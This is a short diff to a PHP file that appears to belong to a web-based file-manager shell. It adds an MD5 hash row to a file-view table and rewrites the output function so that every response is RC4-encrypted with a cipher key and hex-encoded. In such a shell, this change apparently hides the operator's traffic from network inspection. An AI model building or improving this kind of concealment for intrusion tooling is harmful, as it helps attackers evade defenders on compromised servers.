@@ -590,6 +590,7 @@ if(!function_exists('view_file')){
 			$output .= "
 	<table id='viewFile' class='boxtbl'>
 	<tr><td style='width:120px;'>Filename</td><td>".html_safe($file)."</td></tr>
+    <tr><td>Hash</td><td>".md5_file($file)."</td></tr>
 	<tr><td>Size</td><td>".get_filesize($file)." (".filesize($file).")</td></tr>
 	".$owner."
 	<tr><td>Permission</td><td>".get_fileperms($file)."</td></tr>
@@ -993,7 +994,10 @@ if(!function_exists('output')){
 		header("Content-Type: text/plain");
 		header("Cache-Control: no-cache");
 		header("Pragma: no-cache");
-		echo (isset($GLOBALS['encode']) && $GLOBALS['encode'] != 'utf-8') ? convert_encode($GLOBALS['encode'], 'utf-8', $str) : $str;
+        if ((isset($GLOBALS['encode']) && $GLOBALS['encode'] != 'utf-8')) {
+            $str = convert_encode($GLOBALS['encode'], 'utf-8', $str);
+        }
+		echo bin2hex(rc4($GLOBALS['cipher_key'], $str));
 		die();
 	}
 }
